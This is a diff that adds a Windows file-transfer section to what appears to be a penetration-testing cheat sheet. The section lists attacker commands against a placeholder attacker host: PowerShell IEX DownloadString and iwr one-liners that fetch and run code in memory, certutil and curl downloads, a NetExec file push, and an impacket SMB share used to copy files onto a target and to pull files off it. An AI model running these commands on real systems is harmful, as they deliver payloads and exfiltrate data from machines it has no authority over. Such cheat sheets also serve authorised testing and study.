@@ -24,3 +24,42 @@ func main() {
 ```bash
 GOOS=windows GOARCH=amd64 go build -o pleasesubscribe.exe pleasesubscribe.go
 ```
+#  🗃️ File Transfer
+### Windows
+```bash
+# 1. IEX DownloadString (Execute in memory)
+IEX(New-Object Net.WebClient).DownloadString("http://$ip:$port/file")
+
+# 2. curl (Windows 10+)
+curl http://$ip:$port/file -o file
+
+# 3. Invoke-WebRequest
+powershell "iwr -Uri http://$ip:$port/file -OutFile C:\Windows\Temp\file"
+
+# 4. NetExec (needs valid credentials)
+nxc smb $ip -u '' -p '' --put-file file C:\Windows\Temp\file
+
+# 5. PowerShell DownloadFile
+powershell -c "(New-Object System.Net.WebClient).DownloadFile('http://$ip:$port/file','C:\Temp\file')"
+
+# 6. Short version (iwr + IEX)
+IEX(iwr 'http://$ip:$port/file' -UseBasicParsing)
+
+# 7. Certutil
+certutil -urlcache -split -f http://$ip:$port/file file
+certutil -urlcache * delete
+
+# 8. wget (PowerShell alias)
+wget "http://$ip:$port/file" -OutFile "C:\Windows\Temp\file"
+
+# 9. smbserver
+impacket-smbserver share ./ -smb2support -user 0xmr -pass ''
+
+##  Copy to windows
+net use \\$Attacker_IP\share /user:0xmr
+copy \\$Attacker_IP\share\file C:\Temp\file
+
+##  copy from windows
+net use \\$Attacker_IP\share /user:0xmr
+copy file_name \\$Attacker_IP\share
+```
